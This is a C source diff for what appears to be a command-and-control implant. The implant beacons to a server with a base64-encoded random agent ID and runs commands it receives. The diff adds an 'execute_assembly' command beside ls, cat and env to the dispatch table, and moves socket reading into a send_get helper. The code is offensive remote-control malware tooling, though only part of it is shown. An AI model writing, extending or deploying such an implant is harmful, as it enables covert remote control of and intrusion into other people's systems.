@@ -59,6 +59,7 @@ check function[] = {
     {"ls", cmd_ls},
     {"cat", cmd_cat},
     {"env", cmd_env},
+    {"execute_assembly", cmd_execute_assembly},
     {"NULL", NULL}
 };
 
@@ -107,16 +108,18 @@ int main() {
     int charset_len = strlen(charset);
 
     int uuid_len = 16 + 1;
-    char uuid[uuid_len + 1];
+    char tmp_uuid[uuid_len + 1];
     for (int i = 0; i < uuid_len; i++) {
         int uuid_index = rand() % charset_len;
-        uuid[i] = charset[uuid_index];
+        tmp_uuid[i] = charset[uuid_index];
     }
-    uuid[uuid_len] = '\0';
+    tmp_uuid[uuid_len] = '\0';
+    char *uuid = base64_encode((const unsigned char *)tmp_uuid, strlen(tmp_uuid));
+
 
     struct io_uring ring;
-    struct io_uring_sqe *sqe;
-    struct io_uring_cqe *cqe;
+    // struct io_uring_sqe *sqe;
+    // struct io_uring_cqe *cqe;
     hash_insert();
     // --- 2. Initialize io_uring ---
     // This sets up the shared memory rings between our app and the kernel.
@@ -126,7 +129,7 @@ int main() {
     }
 
     
-    size_t n;
+    // size_t n;
     while (true) {
         request_t *req = calloc(1, sizeof(request_t));
         int sockfd = connection(&ring, req);
@@ -136,53 +139,50 @@ int main() {
             continue;
         }
 
-        send_get(&ring, req, uuid);
+        char *http_body = send_get(&ring, req, uuid, "login");
 
-        size_t total_read = 0;
-        int cont_length = -1;
-        int header_parsed = 0;
-        size_t body_offset = 0;
-        while (1) {
-            req->iov.iov_base = req->buffer + total_read;
-            req->iov.iov_len = BUFFER_SIZE - 1 - total_read;
-            sqe = io_uring_get_sqe(&ring);
-            // Prepare the SQE for a receive operation (using readv).
-            io_uring_prep_readv(sqe, req->client_socket, &req->iov, 1, 0);
-            io_uring_sqe_set_data(sqe, req);
-            io_uring_submit(&ring);
-            io_uring_wait_cqe(&ring, &cqe);
-            n = cqe->res;
-            io_uring_cqe_seen(&ring, cqe);
-            req->buffer[n] = '\0';
+        // size_t total_read = 0;
+        // int cont_length = -1;
+        // int header_parsed = 0;
+        // size_t body_offset = 0;
+        // while (1) {
+        //     req->iov.iov_base = req->buffer + total_read;
+        //     req->iov.iov_len = BUFFER_SIZE - 1 - total_read;
+        //     sqe = io_uring_get_sqe(&ring);
+        //     // Prepare the SQE for a receive operation (using readv).
+        //     io_uring_prep_readv(sqe, req->client_socket, &req->iov, 1, 0);
+        //     io_uring_sqe_set_data(sqe, req);
+        //     io_uring_submit(&ring);
+        //     io_uring_wait_cqe(&ring, &cqe);
+        //     n = cqe->res;
+        //     io_uring_cqe_seen(&ring, cqe);
+        //     req->buffer[n] = '\0';
 
-            if (n <= 0) {
-                break;
-            }
+        //     if (n <= 0) {
+        //         break;
+        //     }
 
-            total_read += n;
+        //     total_read += n;
 
-            if (!header_parsed) {
-                char *end = header_end(req->buffer);
-                if (end) {
-                    header_parsed = 1;
-                    body_offset = end - req->buffer + 4;
-                    cont_length = content_length(req->buffer);
-                }
-            }
+        //     if (!header_parsed) {
+        //         char *end = header_end(req->buffer);
+        //         if (end) {
+        //             header_parsed = 1;
+        //             body_offset = end - req->buffer + 4;
+        //             cont_length = content_length(req->buffer);
+        //         }
+        //     }
             
-            if (header_parsed && cont_length > -1) {
-                size_t body_len = total_read - body_offset;
-                if (body_len >= (size_t)content_length) {
-                    break;
-                }
-            }
+        //     if (header_parsed && cont_length > -1) {
+        //         size_t body_len = total_read - body_offset;
+        //         if (body_len >= (size_t)content_length) {
+        //             break;
+        //         }
+        //     }
 
-        }
+        // }
 
-        char *http_body = req->buffer + body_offset;
-        
-        //printf("%s", req->buffer);
-        //sanitize_cmd(http_body);
+        // char *http_body = req->buffer + body_offset;
 
         if (strcmp(http_body, "exit") == 0) {
             close(req->client_socket);
